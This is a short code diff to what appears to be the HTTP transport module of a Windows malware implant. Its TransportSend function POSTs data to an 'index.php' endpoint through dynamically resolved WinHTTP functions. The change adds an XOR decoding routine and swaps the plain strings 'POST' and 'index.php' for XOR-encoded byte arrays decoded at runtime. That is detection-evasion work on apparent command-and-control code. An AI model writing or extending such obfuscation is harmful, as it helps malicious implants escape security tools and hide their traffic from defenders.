@@ -4,6 +4,12 @@
 #include <winhttp.h>
 #include <stdio.h>
 
+#define xor_key 0x8F
+static void xor_decw(PWCHAR buf, SIZE_T len){
+	for (SIZE_T i = 0; i < len; i++)
+		buf[i] ^= xor_key;
+}
+
 extern TRANSPORT_CFG g_TransportCfg;
 
 BOOL TransportSend(LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize){
@@ -58,7 +64,10 @@ BOOL TransportSend(LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize){
     if (g_TransportCfg.Secure)
         dwFlags |= WINHTTP_FLAG_SECURE;
 
-    hRequest = pReq(hConnect, L"POST", L"index.php", NULL, NULL, NULL, dwFlags);
+    WCHAR sPost[] = { 0x00DF,0x00C0,0x00DC,0x00DB, 0x0000 };
+    WCHAR sEndp[] = { 0x00E6,0x00E1,0x00EB,0x00EA,0x00F7,0x00A1,0x00FF,0x00E7,0x00FF, 0x0000 };
+    xor_decw(sPost, 4); xor_decw(sEndp, 9);
+    hRequest = pReq(hConnect, sPost, sEndp, NULL, NULL, NULL, dwFlags);
     if (!hRequest) goto cleanup;
 
     if (g_TransportCfg.Secure && pSetOpt){
